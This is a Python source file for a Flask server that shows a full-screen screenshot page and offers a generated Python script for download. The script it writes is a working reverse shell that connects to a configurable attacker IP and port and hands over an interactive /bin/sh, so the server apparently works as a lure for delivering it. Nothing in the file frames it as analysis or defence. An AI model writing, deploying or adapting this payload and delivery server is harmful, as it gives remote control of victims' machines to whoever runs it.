import os
import sys
import psutil
from flask import Flask, send_file, render_template, send_from_directory
import threading
import time


class ImageServer:
    def __init__(self, port=5800, image_path="assets/screenshot_5800.png", host="localhost"):
        self.port = port
        self.host = host
        self.image_path = image_path
        self.app = Flask(__name__, template_folder="templates")
        self._setup_routes()

    def _setup_routes(self):
        @self.app.route('/')
        def display_image():
            """Serves the image in full-screen mode."""
            return render_template("index.html")

        @self.app.route('/download')
        def download_script():
            """Serves the generated Python script."""
            return send_from_directory("static", "generated_script.py", as_attachment=True)

        @self.app.route('/image')
        def get_image():
            """Returns the image file."""
            return send_file(self.image_path, mimetype='image/png')

    def run_server(self):
        """Runs the Flask server."""
        self.app.run(host=self.host, port=self.port,
                     debug=False, use_reloader=False)

    def start(self):
        """Starts the Flask server in a separate thread."""
        server_thread = threading.Thread(target=self.run_server, daemon=True)
        server_thread.start()
        print(f"Server running on http://localhost:{self.port}")

    def _generate_script(ip_address, port, output_filename="static/generated_script.py"):
        script_content = f'''import socket
import subprocess
import os

# Change this to your attacker's IP and port
ATTACKER_IP = "{ip_address}" 
ATTACKER_PORT = {port}       
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ATTACKER_IP,ATTACKER_PORT))
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
'''
        with open(output_filename, "w") as file:
            file.write(script_content)

        print(f"Python script generated: {output_filename}")
